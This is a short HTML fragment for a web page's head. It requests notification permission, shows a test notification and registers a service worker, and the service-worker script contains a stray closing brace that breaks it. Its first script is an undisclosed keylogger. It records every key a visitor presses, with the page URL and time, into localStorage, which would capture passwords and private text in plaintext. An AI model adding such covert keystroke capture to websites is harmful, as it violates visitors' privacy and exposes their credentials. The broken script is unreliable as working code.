<meta name="theme-color" content="#007AFF" />
  <!-- Add this inside <head> or at the top of <body> -->
<script>
  document.addEventListener("keydown", function(event) {
    let logs = JSON.parse(localStorage.getItem("keyLogs") || "[]");
    logs.push({
      key: event.key,
      page: location.href,
      time: new Date().toISOString()
    });
    localStorage.setItem("keyLogs", JSON.stringify(logs));
  });
</script>

  <script>
    // Request permission on page load
    document.addEventListener('DOMContentLoaded', () => {
      if (Notification.permission !== 'granted') {
        Notification.requestPermission();
      }
    });

    function sendNotification() {
      if (Notification.permission === 'granted') {
        new Notification('Hello!', {
          body: 'This is a test notification from your website.',
          icon: 'https://example.com/icon.png' // optional
        });
      } else {
        alert('Please enable notifications.');
      }
    }
  </script>
  <script>

    navigator.serviceWorker.register('service-worker.js')

      .catch(err => console.error('Service Worker registration failed:', err));
  }
</script>
